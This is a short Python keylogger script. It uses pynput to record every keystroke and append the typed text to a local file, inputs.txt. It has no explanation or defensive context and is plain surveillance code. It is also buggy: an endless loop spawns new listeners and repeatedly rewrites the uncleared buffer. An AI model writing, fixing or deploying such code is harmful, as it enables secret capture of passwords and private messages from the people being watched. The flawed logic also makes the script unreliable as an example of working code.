from pynput import keyboard
import time

data = []

def on_press(key):
  try:
    data.append(f'{key.char[0]}')
  except AttributeError:
    data.append(f'{key}')
  return data

def on_release(key):
    pass

def read_fix_file(data):
  with open ('inputs.txt', 'a') as file:
    datal = ""
    for obj in data:
      if obj == "Key.enter":
        datal += '\n'
      else:
        datal += obj
    file.write(datal)

while True:
  try:
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    read_fix_file(data)

  except KeyboardInterrupt as e:
    read_fix_file(data)
